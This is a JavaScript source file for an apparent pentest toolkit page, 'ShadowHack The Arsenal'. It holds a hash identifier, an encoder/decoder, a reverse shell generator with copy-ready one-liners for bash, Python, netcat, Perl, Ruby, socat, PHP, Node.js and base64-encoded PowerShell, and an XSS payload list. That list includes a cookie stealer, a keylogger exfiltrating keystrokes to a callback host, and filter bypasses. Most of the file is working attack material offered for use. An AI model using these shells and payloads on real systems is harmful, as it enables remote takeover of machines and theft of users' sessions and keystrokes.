/* ============================================================
   SHADOWHACK - PROFESSIONAL TOOLS CENTER (The Arsenal)
   Fully functional client-side security tools
   ============================================================ */

const ToolsCenter = {

  // ==================== REVERSE SHELL TEMPLATES ====================
  shellTemplates: {
    // Linux Shells
    'bash-tcp': {
      name: 'Bash TCP',
      category: 'Linux',
      icon: '🐧',
      template: `bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1`
    },
    'bash-udp': {
      name: 'Bash UDP',
      category: 'Linux',
      icon: '🐧',
      template: `bash -i >& /dev/udp/{{IP}}/{{PORT}} 0>&1`
    },
    'python': {
      name: 'Python',
      category: 'Linux',
      icon: '🐍',
      template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{IP}}",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    },
    'python3': {
      name: 'Python3',
      category: 'Linux',
      icon: '🐍',
      template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{IP}}",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    },
    'nc-e': {
      name: 'Netcat -e',
      category: 'Linux',
      icon: '🔌',
      template: `nc -e /bin/sh {{IP}} {{PORT}}`
    },
    'nc-mkfifo': {
      name: 'Netcat mkfifo',
      category: 'Linux',
      icon: '🔌',
      template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f`
    },
    'perl': {
      name: 'Perl',
      category: 'Linux',
      icon: '🐪',
      template: `perl -e 'use Socket;$i="{{IP}}";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    },
    'ruby': {
      name: 'Ruby',
      category: 'Linux',
      icon: '💎',
      template: `ruby -rsocket -e'f=TCPSocket.open("{{IP}}",{{PORT}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    },
    'socat': {
      name: 'Socat',
      category: 'Linux',
      icon: '🔗',
      template: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{IP}}:{{PORT}}`
    },
    // Web Shells
    'php': {
      name: 'PHP',
      category: 'Web',
      icon: '🐘',
      template: `php -r '$sock=fsockopen("{{IP}}",{{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'`
    },
    'php-proc': {
      name: 'PHP proc_open',
      category: 'Web',
      icon: '🐘',
      template: `php -r '$sock=fsockopen("{{IP}}",{{PORT}});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`
    },
    'nodejs': {
      name: 'Node.js',
      category: 'Web',
      icon: '🟢',
      template: `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({{PORT}},"{{IP}}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`
    },
    // Windows Shells
    'powershell': {
      name: 'PowerShell',
      category: 'Windows',
      icon: '🪟',
      template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
    },
    'powershell-short': {
      name: 'PowerShell (Short)',
      category: 'Windows',
      icon: '🪟',
      template: `powershell -e {{BASE64}}`
    }
  },

  // ==================== HASH PATTERNS ====================
  hashPatterns: [
    { regex: /^[a-f0-9]{32}$/i, types: ['MD5', 'NTLM', 'LM'] },
    { regex: /^[a-f0-9]{40}$/i, types: ['SHA-1', 'RIPEMD-160'] },
    { regex: /^[a-f0-9]{64}$/i, types: ['SHA-256', 'SHA3-256', 'BLAKE2'] },
    { regex: /^[a-f0-9]{96}$/i, types: ['SHA-384'] },
    { regex: /^[a-f0-9]{128}$/i, types: ['SHA-512', 'SHA3-512', 'Whirlpool'] },
    { regex: /^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{22}$/, types: ['MD5 Crypt (Unix)'] },
    { regex: /^\$2[ayb]\$[0-9]{2}\$[a-zA-Z0-9./]{53}$/, types: ['Bcrypt'] },
    { regex: /^\$5\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{43}$/, types: ['SHA-256 Crypt'] },
    { regex: /^\$6\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{86}$/, types: ['SHA-512 Crypt'] },
    { regex: /^\*[A-F0-9]{40}$/i, types: ['MySQL 4.1+'] },
    { regex: /^[a-f0-9]{16}$/i, types: ['MySQL (Old)', 'DES'] },
    { regex: /^[a-f0-9]{56}$/i, types: ['SHA-224'] },
    { regex: /^pbkdf2_sha256\$/, types: ['Django PBKDF2-SHA256'] },
    { regex: /^sha1\$[a-z0-9]+\$[a-f0-9]{40}$/i, types: ['Django SHA-1'] },
    { regex: /^[a-f0-9]{32}:[a-zA-Z0-9]+$/i, types: ['MD5 (Joomla)'] },
    { regex: /^eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*$/, types: ['JWT Token'] }
  ],

  // ==================== INITIALIZE ====================
  init() {
    // Auto-update reverse shell on load
    setTimeout(() => {
      this.updateReverseShell();
    }, 100);
  },

  // ==================== REVERSE SHELL GENERATOR ====================
  updateReverseShell() {
    const ip = document.getElementById('rs-ip')?.value || '10.10.10.10';
    const port = document.getElementById('rs-port')?.value || '4444';
    const type = document.getElementById('rs-type')?.value || 'bash-tcp';

    const shell = this.shellTemplates[type];
    if (!shell) return;

    let output = shell.template
      .replace(/\{\{IP\}\}/g, ip)
      .replace(/\{\{PORT\}\}/g, port);

    // Handle PowerShell Base64
    if (type === 'powershell-short') {
      const psCommand = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      const bytes = new TextEncoder().encode(psCommand);
      const utf16 = new Uint16Array(bytes.length);
      bytes.forEach((b, i) => utf16[i] = b);
      output = output.replace('{{BASE64}}', btoa(String.fromCharCode.apply(null, new Uint8Array(utf16.buffer))));
    }

    const outputEl = document.getElementById('rs-output');
    if (outputEl) {
      outputEl.value = output;
      // Highlight effect
      outputEl.style.borderColor = '#22c55e';
      setTimeout(() => {
        outputEl.style.borderColor = 'rgba(34, 197, 94, 0.3)';
      }, 300);
    }
  },

  copyReverseShell() {
    const output = document.getElementById('rs-output');
    if (output) {
      navigator.clipboard.writeText(output.value);
      this.showNotification('✅ Copied to clipboard!', 'success');
    }
  },

  // ==================== HASH IDENTIFIER ====================
  identifyHash() {
    const input = document.getElementById('hash-input')?.value?.trim() || '';
    const resultsEl = document.getElementById('hash-results');

    if (!input) {
      resultsEl.innerHTML = `
        <div style="text-align: center; color: rgba(255,255,255,0.4); padding: 40px;">
          <i class="fas fa-fingerprint" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
          Enter a hash to identify its type
        </div>
      `;
      return;
    }

    const matches = [];

    for (const pattern of this.hashPatterns) {
      if (pattern.regex.test(input)) {
        pattern.types.forEach(type => {
          matches.push({
            type,
            confidence: matches.length === 0 ? 'High' : 'Possible'
          });
        });
      }
    }

    if (matches.length === 0) {
      resultsEl.innerHTML = `
        <div style="text-align: center; color: #ef4444; padding: 20px;">
          <i class="fas fa-question-circle" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
          <strong>Unknown Hash Type</strong>
          <div style="font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 10px;">
            Length: ${input.length} characters
          </div>
        </div>
      `;
      return;
    }

    resultsEl.innerHTML = `
      <div style="margin-bottom: 15px;">
        <span style="color: rgba(255,255,255,0.5); font-size: 12px;">
          <i class="fas fa-ruler"></i> Length: ${input.length} characters
        </span>
      </div>
      ${matches.map((m, i) => `
        <div style="display: flex; align-items: center; justify-content: space-between; 
                    padding: 12px 16px; background: rgba(168, 85, 247, ${0.2 - i * 0.03}); 
                    border-radius: 10px; margin-bottom: 8px; border-left: 3px solid ${m.confidence === 'High' ? '#22c55e' : '#f59e0b'};">
          <div>
            <span style="color: #fff; font-weight: 600;">${m.type}</span>
            ${i === 0 ? '<span style="margin-left: 10px; font-size: 10px; background: #22c55e; color: #000; padding: 2px 8px; border-radius: 10px; font-weight: 600;">MOST LIKELY</span>' : ''}
          </div>
          <span style="color: ${m.confidence === 'High' ? '#22c55e' : '#f59e0b'}; font-size: 12px;">
            ${m.confidence}
          </span>
        </div>
      `).join('')}
      <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1);">
        <button onclick="ToolsCenter.searchHashcat('${matches[0]?.type}')" 
                style="width: 100%; padding: 10px; background: rgba(168, 85, 247, 0.3); border: 1px solid #a855f7; 
                       color: #a855f7; border-radius: 8px; cursor: pointer; font-weight: 600;">
          <i class="fas fa-search"></i> Find Hashcat Mode
        </button>
      </div>
    `;
  },

  searchHashcat(hashType) {
    const hashcatModes = {
      'MD5': '0', 'SHA-1': '100', 'SHA-256': '1400', 'SHA-512': '1700',
      'NTLM': '1000', 'Bcrypt': '3200', 'MD5 Crypt (Unix)': '500',
      'SHA-512 Crypt': '1800', 'MySQL 4.1+': '300', 'SHA-384': '10800'
    };

    const mode = hashcatModes[hashType] || 'unknown';
    this.showNotification(`Hashcat mode for ${hashType}: -m ${mode}`, 'info');
  },

  // ==================== ENCODER/DECODER ====================
  encode() {
    const input = document.getElementById('enc-input')?.value || '';
    const type = document.getElementById('enc-type')?.value || 'base64';
    let output = '';

    try {
      switch (type) {
        case 'base64':
          output = btoa(unescape(encodeURIComponent(input)));
          break;
        case 'url':
          output = encodeURIComponent(input);
          break;
        case 'url-full':
          output = input.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
          break;
        case 'html':
          output = input.replace(/[&<>"']/g, char => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[char]);
          break;
        case 'hex':
          output = input.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
          break;
        case 'unicode':
          output = input.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
          break;
        case 'binary':
          output = input.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
          break;
        case 'rot13':
          output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
          break;
      }
    } catch (e) {
      output = 'Error: ' + e.message;
    }

    document.getElementById('enc-output').value = output;
    this.showNotification('✅ Encoded!', 'success');
  },

  decode() {
    const input = document.getElementById('enc-input')?.value || '';
    const type = document.getElementById('enc-type')?.value || 'base64';
    let output = '';

    try {
      switch (type) {
        case 'base64':
          output = decodeURIComponent(escape(atob(input)));
          break;
        case 'url':
        case 'url-full':
          output = decodeURIComponent(input);
          break;
        case 'hex':
          output = input.match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || '';
          break;
        case 'unicode':
          output = input.replace(/\\u([0-9a-fA-F]{4})/g, (_, code) => String.fromCharCode(parseInt(code, 16)));
          break;
        case 'binary':
          output = input.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('');
          break;
        case 'rot13':
          output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
          break;
        case 'html':
          const textarea = document.createElement('textarea');
          textarea.innerHTML = input;
          output = textarea.value;
          break;
      }
    } catch (e) {
      output = 'Error: Invalid input for decoding';
    }

    document.getElementById('enc-output').value = output;
    this.showNotification('✅ Decoded!', 'success');
  },

  copyEncoderOutput() {
    const output = document.getElementById('enc-output');
    if (output) {
      navigator.clipboard.writeText(output.value);
      this.showNotification('✅ Copied!', 'success');
    }
  },

  swapEncoderFields() {
    const input = document.getElementById('enc-input');
    const output = document.getElementById('enc-output');
    const temp = input.value;
    input.value = output.value;
    output.value = temp;
  },

  // ==================== XSS PAYLOADS ====================
  xssPayloads: [
    { name: 'Basic Alert', payload: `<script>alert('XSS')</script>`, category: 'Basic' },
    { name: 'IMG Error', payload: `<img src=x onerror=alert('XSS')>`, category: 'Basic' },
    { name: 'SVG Onload', payload: `<svg onload=alert('XSS')>`, category: 'Basic' },
    { name: 'Body Onload', payload: `<body onload=alert('XSS')>`, category: 'Basic' },
    { name: 'Input Autofocus', payload: `<input onfocus=alert('XSS') autofocus>`, category: 'Events' },
    { name: 'Marquee', payload: `<marquee onstart=alert('XSS')>`, category: 'Events' },
    { name: 'Details', payload: `<details open ontoggle=alert('XSS')>`, category: 'Events' },
    { name: 'Cookie Stealer', payload: `<script>new Image().src="http://{{IP}}:{{PORT}}/?c="+document.cookie</script>`, category: 'Steal' },
    { name: 'Keylogger', payload: `<script>document.onkeypress=function(e){new Image().src="http://{{IP}}:{{PORT}}/?k="+e.key}</script>`, category: 'Steal' },
    { name: 'Redirect', payload: `<script>location='http://{{IP}}:{{PORT}}'</script>`, category: 'Redirect' },
    { name: 'Filter Bypass (No Quotes)', payload: `<img src=x onerror=alert(String.fromCharCode(88,83,83))>`, category: 'Bypass' },
    { name: 'Filter Bypass (Case)', payload: `<ScRiPt>alert('XSS')</sCrIpT>`, category: 'Bypass' },
    { name: 'UTF-7', payload: `+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-`, category: 'Bypass' }
  ],

  copyXSSPayload(index) {
    const ip = document.getElementById('xss-ip')?.value || '10.10.10.10';
    const port = document.getElementById('xss-port')?.value || '8080';
    let payload = this.xssPayloads[index].payload
      .replace(/\{\{IP\}\}/g, ip)
      .replace(/\{\{PORT\}\}/g, port);

    navigator.clipboard.writeText(payload);
    this.showNotification('✅ Payload copied!', 'success');
  },

  // ==================== NOTIFICATION ====================
  showNotification(message, type = 'info') {
    // Remove existing notifications
    document.querySelectorAll('.tools-notification').forEach(n => n.remove());

    const colors = {
      success: '#22c55e',
      error: '#ef4444',
      info: '#3b82f6',
      warning: '#f59e0b'
    };

    const notification = document.createElement('div');
    notification.className = 'tools-notification';
    notification.style.cssText = `
      position: fixed;
      bottom: 20px;
      right: 20px;
      padding: 12px 24px;
      background: ${colors[type] || colors.info};
      color: #fff;
      border-radius: 10px;
      font-weight: 600;
      z-index: 10000;
      animation: slideIn 0.3s ease;
      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
    `;
    notification.innerHTML = message;

    document.body.appendChild(notification);

    setTimeout(() => {
      notification.style.animation = 'slideOut 0.3s ease forwards';
      setTimeout(() => notification.remove(), 300);
    }, 2000);
  },

  // ==================== RENDER PAGE ====================
  renderPage() {
    const isArabic = document.documentElement.lang === 'ar';

    return `
      <style>
        @keyframes slideIn {
          from { transform: translateX(100px); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(100px); opacity: 0; }
        }
        .tool-card {
          background: linear-gradient(135deg, rgba(30, 41, 59, 0.8), rgba(15, 23, 42, 0.9));
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 16px;
          padding: 24px;
          transition: all 0.3s;
        }
        .tool-card:hover {
          border-color: rgba(34, 197, 94, 0.5);
          box-shadow: 0 0 30px rgba(34, 197, 94, 0.1);
        }
        .tool-input {
          width: 100%;
          padding: 12px 16px;
          background: rgba(0,0,0,0.3);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 10px;
          color: #fff;
          font-family: 'JetBrains Mono', monospace;
          font-size: 14px;
          transition: all 0.3s;
        }
        .tool-input:focus {
          outline: none;
          border-color: #22c55e;
          box-shadow: 0 0 15px rgba(34, 197, 94, 0.2);
        }
        .tool-select {
          width: 100%;
          padding: 12px 16px;
          background: rgba(0,0,0,0.3);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 10px;
          color: #fff;
          font-size: 14px;
          cursor: pointer;
        }
        .tool-btn {
          padding: 12px 24px;
          border: none;
          border-radius: 10px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: inline-flex;
          align-items: center;
          gap: 8px;
        }
        .tool-btn-primary {
          background: linear-gradient(135deg, #22c55e, #16a34a);
          color: #000;
        }
        .tool-btn-primary:hover {
          transform: translateY(-2px);
          box-shadow: 0 10px 30px rgba(34, 197, 94, 0.3);
        }
        .tool-btn-secondary {
          background: rgba(255,255,255,0.1);
          color: #fff;
          border: 1px solid rgba(255,255,255,0.2);
        }
        .tool-btn-secondary:hover {
          background: rgba(255,255,255,0.15);
        }
        .tool-output {
          width: 100%;
          min-height: 120px;
          padding: 16px;
          background: rgba(0,0,0,0.4);
          border: 1px solid rgba(34, 197, 94, 0.3);
          border-radius: 10px;
          color: #22c55e;
          font-family: 'JetBrains Mono', monospace;
          font-size: 13px;
          resize: vertical;
          transition: border-color 0.3s;
        }
        .xss-item {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 12px;
          background: rgba(0,0,0,0.2);
          border-radius: 10px;
          margin-bottom: 8px;
          transition: all 0.3s;
        }
        .xss-item:hover {
          background: rgba(245, 158, 11, 0.1);
        }
        .category-badge {
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
      </style>
      
      <div style="padding: 30px; max-width: 1400px; margin: 0 auto;">
        <!-- Header -->
        <div style="text-align: center; margin-bottom: 40px;">
          <h1 style="color: #22c55e; font-size: 2.5rem; font-family: 'Orbitron', sans-serif; margin-bottom: 10px;">
            <i class="fas fa-toolbox"></i> ${isArabic ? 'مركز الأدوات' : 'THE ARSENAL'}
          </h1>
          <p style="color: rgba(255,255,255,0.6);">
            ${isArabic ? 'أدوات احترافية لاختبار الاختراق' : 'Professional Security Testing Tools'}
          </p>
        </div>
        
        <!-- Tools Grid -->
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(450px, 1fr)); gap: 24px;">
          
          <!-- REVERSE SHELL GENERATOR -->
          <div class="tool-card">
            <h3 style="color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
              <span style="width: 40px; height: 40px; background: linear-gradient(135deg, #22c55e, #16a34a); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                <i class="fas fa-terminal"></i>
              </span>
              ${isArabic ? 'مولد الشل العكسي' : 'Reverse Shell Generator'}
            </h3>
            
            <div style="display: grid; grid-template-columns: 1fr 100px; gap: 12px; margin-bottom: 16px;">
              <input type="text" id="rs-ip" class="tool-input" placeholder="LHOST (Your IP)" value="10.10.10.10" oninput="ToolsCenter.updateReverseShell()">
              <input type="number" id="rs-port" class="tool-input" placeholder="PORT" value="4444" oninput="ToolsCenter.updateReverseShell()">
            </div>
            
            <select id="rs-type" class="tool-select" onchange="ToolsCenter.updateReverseShell()" style="margin-bottom: 16px;">
              <optgroup label="🐧 Linux">
                ${Object.entries(this.shellTemplates).filter(([k, v]) => v.category === 'Linux').map(([key, shell]) =>
      `<option value="${key}">${shell.icon} ${shell.name}</option>`
    ).join('')}
              </optgroup>
              <optgroup label="🌐 Web">
                ${Object.entries(this.shellTemplates).filter(([k, v]) => v.category === 'Web').map(([key, shell]) =>
      `<option value="${key}">${shell.icon} ${shell.name}</option>`
    ).join('')}
              </optgroup>
              <optgroup label="🪟 Windows">
                ${Object.entries(this.shellTemplates).filter(([k, v]) => v.category === 'Windows').map(([key, shell]) =>
      `<option value="${key}">${shell.icon} ${shell.name}</option>`
    ).join('')}
              </optgroup>
            </select>
            
            <textarea id="rs-output" class="tool-output" readonly placeholder="Generated reverse shell will appear here..."></textarea>
            
            <div style="display: flex; gap: 10px; margin-top: 16px;">
              <button class="tool-btn tool-btn-primary" onclick="ToolsCenter.copyReverseShell()" style="flex: 1;">
                <i class="fas fa-copy"></i> ${isArabic ? 'نسخ' : 'Copy'}
              </button>
              <button class="tool-btn tool-btn-secondary" onclick="ToolsCenter.updateReverseShell()">
                <i class="fas fa-sync"></i>
              </button>
            </div>
          </div>
          
          <!-- HASH IDENTIFIER -->
          <div class="tool-card">
            <h3 style="color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
              <span style="width: 40px; height: 40px; background: linear-gradient(135deg, #a855f7, #9333ea); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                <i class="fas fa-fingerprint"></i>
              </span>
              ${isArabic ? 'معرّف الهاش' : 'Hash Identifier'}
            </h3>
            
            <input type="text" id="hash-input" class="tool-input" 
                   placeholder="${isArabic ? 'الصق الهاش هنا...' : 'Paste your hash here...'}"
                   oninput="ToolsCenter.identifyHash()" style="margin-bottom: 16px;">
            
            <div id="hash-results" style="min-height: 200px; background: rgba(0,0,0,0.2); border-radius: 10px; padding: 20px;">
              <div style="text-align: center; color: rgba(255,255,255,0.4); padding: 40px;">
                <i class="fas fa-fingerprint" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
                ${isArabic ? 'أدخل هاش للتعرف عليه' : 'Enter a hash to identify its type'}
              </div>
            </div>
          </div>
          
          <!-- ENCODER/DECODER -->
          <div class="tool-card">
            <h3 style="color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
              <span style="width: 40px; height: 40px; background: linear-gradient(135deg, #06b6d4, #0891b2); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                <i class="fas fa-exchange-alt"></i>
              </span>
              ${isArabic ? 'التشفير / فك التشفير' : 'Encoder / Decoder'}
            </h3>
            
            <textarea id="enc-input" class="tool-input" placeholder="${isArabic ? 'أدخل النص...' : 'Enter text...'}" 
                      style="height: 80px; resize: none; margin-bottom: 12px;"></textarea>
            
            <div style="display: flex; gap: 10px; margin-bottom: 12px;">
              <select id="enc-type" class="tool-select" style="flex: 1;">
                <option value="base64">Base64</option>
                <option value="url">URL Encode</option>
                <option value="url-full">URL Encode (Full)</option>
                <option value="html">HTML Entities</option>
                <option value="hex">Hexadecimal</option>
                <option value="unicode">Unicode (\\u)</option>
                <option value="binary">Binary</option>
                <option value="rot13">ROT13</option>
              </select>
              <button class="tool-btn tool-btn-secondary" onclick="ToolsCenter.swapEncoderFields()" title="Swap">
                <i class="fas fa-exchange-alt"></i>
              </button>
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 12px;">
              <button class="tool-btn tool-btn-primary" onclick="ToolsCenter.encode()" style="flex: 1;">
                <i class="fas fa-lock"></i> Encode
              </button>
              <button class="tool-btn tool-btn-secondary" onclick="ToolsCenter.decode()" style="flex: 1;">
                <i class="fas fa-unlock"></i> Decode
              </button>
            </div>
            
            <textarea id="enc-output" class="tool-output" readonly placeholder="${isArabic ? 'النتيجة...' : 'Result...'}" 
                      style="height: 80px; color: #06b6d4; border-color: rgba(6, 182, 212, 0.3);"></textarea>
            
            <button class="tool-btn tool-btn-secondary" onclick="ToolsCenter.copyEncoderOutput()" style="width: 100%; margin-top: 12px;">
              <i class="fas fa-copy"></i> ${isArabic ? 'نسخ النتيجة' : 'Copy Result'}
            </button>
          </div>
          
          <!-- XSS PAYLOADS -->
          <div class="tool-card">
            <h3 style="color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
              <span style="width: 40px; height: 40px; background: linear-gradient(135deg, #f59e0b, #d97706); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                <i class="fas fa-bug"></i>
              </span>
              ${isArabic ? 'بايلودات XSS' : 'XSS Payloads'}
            </h3>
            
            <div style="display: grid; grid-template-columns: 1fr 100px; gap: 12px; margin-bottom: 16px;">
              <input type="text" id="xss-ip" class="tool-input" placeholder="Callback IP" value="10.10.10.10">
              <input type="number" id="xss-port" class="tool-input" placeholder="Port" value="8080">
            </div>
            
            <div style="max-height: 300px; overflow-y: auto;">
              ${this.xssPayloads.map((p, i) => `
                <div class="xss-item">
                  <span class="category-badge" style="background: ${p.category === 'Basic' ? '#22c55e22' :
        p.category === 'Steal' ? '#ef444422' :
          p.category === 'Bypass' ? '#a855f722' : '#f59e0b22'
      }; color: ${p.category === 'Basic' ? '#22c55e' :
        p.category === 'Steal' ? '#ef4444' :
          p.category === 'Bypass' ? '#a855f7' : '#f59e0b'
      };">${p.category}</span>
                  <span style="flex: 1; color: #fff; font-weight: 500;">${p.name}</span>
                  <button onclick="ToolsCenter.copyXSSPayload(${i})" class="tool-btn tool-btn-secondary" style="padding: 8px 16px;">
                    <i class="fas fa-copy"></i>
                  </button>
                </div>
              `).join('')}
            </div>
          </div>
          
        </div>
      </div>
    `;
  }
};

// Page function for routing
function pageToolsCenter() {
  setTimeout(() => ToolsCenter.init(), 100);
  return ToolsCenter.renderPage();
}

// Also alias as toolshub
function pageToolshub() {
  return pageToolsCenter();
}
